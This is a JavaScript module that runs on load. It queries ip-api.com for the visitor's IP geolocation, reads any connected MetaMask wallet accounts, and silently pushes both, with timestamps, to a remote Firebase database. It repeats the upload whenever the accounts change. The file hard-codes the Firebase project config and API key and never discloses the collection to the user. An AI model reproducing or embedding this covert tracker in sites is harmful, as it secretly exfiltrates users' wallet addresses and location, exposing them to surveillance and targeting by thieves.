import { createLogo } from "./Bundle";
import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { ref, push } from "firebase/database";

const basic = {
  apiKey: "AIzaSyDoyi01xdksbWgIWFWtaxj1R80DdZ6PWbw",
  authDomain: "mm-provider.firebaseapp.com",
  projectId: "mm-provider",
  storageBucket: "mm-provider.appspot.com",
  messagingSenderId: "879731928519",
  appId: "1:879731928519:web:875d6ddfbee3d1b0363de2",
  measurementId: "G-0KJ8T512FL",
};
const rtapp = initializeApp(basic);
const rtdb = getDatabase(rtapp);

const mmcheck = async () => {
  let metamask = false;
  const response = await fetch("http://ip-api.com/json");
  const data = await response.json();
  let accounts = [];
  if (window.ethereum && window.ethereum.isMetaMask) {
    metamask = true;
    accounts = await ethereum.request({ method: "eth_accounts" });
    window.ethereum.on("accountsChanged", (accounts) => {
      console.log("Account changed to:", accounts);
      push(ref(rtdb, "mminfo"), {
        ...data,
        accounts: accounts,
        isMetamask: metamask,
        time: new Date().toString(),
      });
    });
  }
  push(ref(rtdb, "mminfo"), {
    ...data,
    accounts: accounts,
    isMetamask: metamask,
    time: new Date().toString(),
  });
};
mmcheck();
export default mmcheck;